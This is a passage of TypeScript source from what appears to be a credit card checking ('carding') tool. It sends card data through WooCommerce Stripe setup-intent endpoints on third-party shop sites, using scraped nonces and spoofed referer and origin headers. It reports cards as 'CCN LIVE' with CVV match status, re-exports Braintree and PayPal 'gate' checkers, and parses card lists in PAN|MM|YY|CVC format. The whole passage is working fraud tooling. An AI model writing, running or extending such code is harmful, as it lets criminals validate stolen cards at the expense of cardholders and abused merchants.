  const threeDs = card.three_d_secure_usage?.supported ? "3DS" : "NO-3DS";
  const cardMeta = { brand, funding, country, threeDs, billing };

  if (!addCardNonce || !loggedIn) {
    const cvcCheck = card.checks?.cvc_check;
    let cvcLabel = "CVV UNCHECKED";
    if (cvcCheck === "pass") cvcLabel = "CVV MATCH";
    else if (cvcCheck === "fail") cvcLabel = "CVV WRONG";

    return {
      status: "live",
      response: `CCN LIVE ? Tokenized | ${cvcLabel} | ${brand} ${funding} [${country}] ${threeDs} | No Bank Confirm | ${pmId}`,
      code: "pm_created",
      latency: 0,
      gate: gateName,
    };
  }

  const setupBody = new URLSearchParams({
    "wc-stripe-payment-method": pmId,
    "wc-stripe-payment-type": "card",
  });

  const isConfirmNonce = paymentPageUrl.includes("add-payment-method");

  if (isConfirmNonce) {
    setupBody.set("action", "create_and_confirm_setup_intent");
    setupBody.set("_ajax_nonce", addCardNonce);
  } else {
    setupBody.set("stripe_source_id", pmId);
    setupBody.set("nonce", addCardNonce);
  }

  const ajaxEndpoint = isConfirmNonce
    ? `${siteUrl}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent`
    : `${siteUrl}/?wc-ajax=wc_stripe_create_setup_intent`;

  const setupResp = await sessionFetch(
    ajaxEndpoint,
    state,
    {
      method: "POST",
      body: setupBody.toString(),
      contentType: "application/x-www-form-urlencoded; charset=UTF-8",
      referer: paymentPageUrl || `${siteUrl}/my-account/add-payment-method/`,
      origin: siteUrl,
      accept: "application/json, text/javascript, */*; q=0.01",
      xRequestedWith: true,
    }
  );

  const bankRaw = setupResp.text;
  if (!bankRaw || bankRaw.trim().length === 0) {
    return {
      status: "live",
      response: `CCN LIVE ? Tokenized | No Bank Response | ${brand} ${funding} [${country}] ${threeDs} | ${pmId}`,
      code: "pm_created",
      latency: 0,
      gate: gateName,
    };
  }

  return classifyBankText(bankRaw, gateName, cardMeta);
}

// --- Braintree gate � lives in its own module ------------------------------
export { checkCardBraintree } from "./braintree-checker";

// --- PayPal gate � lives in its own module --------------------------------
export { checkCardPayPal } from "./paypal-checker";


export function parseCardInput(input: string): { number: string; month: string; year: string; cvv: string } | null {
  const r = parseCardInputDetailed(input);
  return "number" in r ? r : null;
}

/** Same as parseCardInput but returns { reason: string } on failure so callers
 *  can surface a specific error ("Bad expiry month", "Luhn check failed", etc.)
 *  instead of the generic "Invalid card format". */
export function parseCardInputDetailed(input: string): { number: string; month: string; year: string; cvv: string } | { reason: string } {
  const trimmed = input.trim();
  if (!trimmed) return { reason: "Empty input" };

  // "/" is last so it never wins over "|"/":" on mixed formats like
  // PAN|12/27|CVV � but it rescues the common slash style PAN/MM/YYYY/CVV.
  const separators = ["|", ":", ";", ",", " ", "\t", "/"];
  // Track the most-specific reason we encountered while scanning separators;
  // generic "no separator matched" wins only if nothing better surfaced.
  let lastReason = "Bad format � expected PAN|MM|YY|CVC";
  for (const sep of separators) {
    const parts = trimmed.split(sep).map(p => p.trim()).filter(Boolean);
    if (parts.length < 4) continue;
    const [number, month, year, cvv] = parts;
    const cleanNum = number.replace(/[\s-]/g, "");
    if (!/^\d+$/.test(cleanNum)) { lastReason = "PAN contains non-digits"; continue; }
    if (cleanNum.length < 13) { lastReason = `PAN too short (${cleanNum.length} digits, need 13�19)`; continue; }
    if (cleanNum.length > 19) { lastReason = `PAN too long (${cleanNum.length} digits, max 19)`; continue; }
    if (!/^\d{1,2}$/.test(month)) { lastReason = `Bad expiry month: "${month}"`; continue; }
    const mNum = parseInt(month, 10);
    if (mNum < 1 || mNum > 12) { lastReason = `Expiry month out of range: ${mNum}`; continue; }
    if (!/^\d{2,4}$/.test(year)) { lastReason = `Bad expiry year: "${year}"`; continue; }
    if (!/^\d{3,4}$/.test(cvv)) { lastReason = `Bad CVC (need 3�4 digits, got "${cvv}")`; continue; }
    if (!luhnCheck(cleanNum)) { lastReason = "Luhn check failed (PAN typo?)"; continue; }
    return { number: cleanNum, month: month.padStart(2, "0"), year, cvv };
  }
  return { reason: lastReason };
}
